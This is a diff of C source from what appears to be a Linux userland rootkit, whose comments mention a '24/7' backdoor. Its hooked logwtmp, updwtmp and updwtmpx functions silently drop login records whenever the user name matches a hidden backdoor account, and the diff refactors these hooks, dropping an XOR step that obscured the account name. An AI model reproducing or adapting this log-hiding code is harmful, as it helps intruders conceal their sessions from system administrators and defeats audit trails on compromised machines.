@@ -22,47 +22,39 @@
  * backdoor 24/7.
  */
 
-void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host)
-{
+void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host){
     if(hide_me) return;
 
-    xor(bd_uname, BD_UNAME);
-    if(!strcmp(ut_name, bd_uname)) hide_me = 1;
-    clean(bd_uname);
+    if(!strncmp(BD_UNAME, ut_name, strlen(BD_UNAME)))
+        hide_me = 1;
 
     if(hide_me) return;
     hook(CLOGWTMP);
-    (void)call(CLOGWTMP, ut_line, ut_name, ut_host);
+    call(CLOGWTMP, ut_line, ut_name, ut_host);
 }
 
-void updwtmp(const char *wfile, const struct utmp *ut)
-{
+void updwtmp(const char *wfile, const struct utmp *ut){
     if(hide_me) return;
 
-    if(ut && ut->ut_user != NULL)
-    {
-        xor(bd_uname, BD_UNAME);
-        if(!strncmp(ut->ut_user, bd_uname, sizeof(ut->ut_user))) hide_me = 1;
-        clean(bd_uname);
+    if(ut && ut->ut_user != NULL){
+        if(!strncmp(BD_UNAME, ut->ut_user, strlen(BD_UNAME)))
+            hide_me = 1;
     }
 
     if(hide_me) return;
     hook(CUPDWTMP);
-    (void)call(CUPDWTMP, wfile, ut);
+    call(CUPDWTMP, wfile, ut);
 }
 
-void updwtmpx(const char *wfilex, const struct utmpx *utx)
-{
+void updwtmpx(const char *wfilex, const struct utmpx *utx){
     if(hide_me) return;
 
-    if(utx && utx->ut_user != NULL)
-    {
-        xor(bd_uname, BD_UNAME);
-        if(!strncmp(utx->ut_user, bd_uname, sizeof(utx->ut_user))) hide_me = 1;
-        clean(bd_uname);
+    if(utx && utx->ut_user != NULL){
+        if(!strncmp(BD_UNAME, utx->ut_user, strlen(BD_UNAME)))
+            hide_me = 1;
     }
 
     if(hide_me) return;
     hook(CUPDWTMPX);
-    (void)call(CUPDWTMPX, wfilex, utx);
+    call(CUPDWTMPX, wfilex, utx);
 }
